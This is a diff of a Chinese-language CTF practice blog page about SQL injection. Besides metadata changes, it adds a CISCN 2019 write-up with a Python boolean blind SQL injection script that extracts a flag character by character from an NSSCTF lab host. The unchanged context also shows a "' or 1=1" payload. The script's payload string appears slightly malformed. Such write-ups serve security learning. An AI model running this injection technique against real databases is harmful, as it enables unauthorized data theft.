@@ -49,7 +49,7 @@
 <meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/CTF/CTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/web/sql/image-20240121153945954.png">
 <meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/CTF/CTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/web/sql/image-20240121155702752.png">
 <meta property="article:published_time" content="2024-01-07T14:43:30.000Z">
-<meta property="article:modified_time" content="2024-01-21T08:08:33.128Z">
+<meta property="article:modified_time" content="2024-01-27T11:51:01.695Z">
 <meta property="article:author" content="August Rosenberg">
 <meta property="article:tag" content="CTF刷题记录">
 <meta name="twitter:card" content="summary_large_image">
@@ -253,7 +253,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          2.1k words
+          2.7k words
         
       </span>
     
@@ -264,7 +264,7 @@
         
         
         
-          18 mins
+          23 mins
         
       </span>
     
@@ -409,6 +409,13 @@
 <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">1</span><span class="hljs-string">&#x27; or 1=1;</span><br></code></pre></td></tr></table></figure>
 
 <p>使用这个的原因是，我们没有指定flag(word)对应的id，所以只要为真就能xian’shi</p>
+<h1 id="CISCN-2019华北Day2-Web1"><a href="#CISCN-2019华北Day2-Web1" class="headerlink" title="[CISCN 2019华北Day2]Web1"></a>[CISCN 2019华北Day2]Web1</h1><p>0x01</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> string<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">blind_injection</span>(<span class="hljs-params">url</span>):<br>	flag = <span class="hljs-string">&#x27;&#x27;</span><br>	strings = string.printable<br>	<span class="hljs-keyword">for</span> num <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">60</span>):<br>		<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> strings:<br>			payload = <span class="hljs-string">&#x27;(select(ascii(mid(flag,&#123;0&#125;1,))=&#123;1&#125;)from(flag))&#x27;</span>.<span class="hljs-built_in">format</span>(num,<span class="hljs-built_in">ord</span>(i)) <span class="hljs-comment"># 查询字段名，是否是正确的</span><br>			post_data = &#123;<span class="hljs-string">&quot;id&quot;</span>:payload&#125;<br>			res = requests.post(url=url,data=post_data)<br>			<span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;Hello&#x27;</span> <span class="hljs-keyword">in</span> res.text:<br>				flag += i<br>				<span class="hljs-built_in">print</span>(flag)<br>			<span class="hljs-keyword">else</span>:<br>				<span class="hljs-keyword">continue</span><br>	<span class="hljs-built_in">print</span>(flag)<br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>	url = <span class="hljs-string">&#x27;http://node4.anna.nssctf.cn:28673/index.php&#x27;</span><br>	blind_injection(url)<br><br></code></pre></td></tr></table></figure>
+
+
+
+<p>0x02</p>
+<p>基本思路就是，使用bool盲注的方式获取字段里面的值</p>
 
                 
               </div>
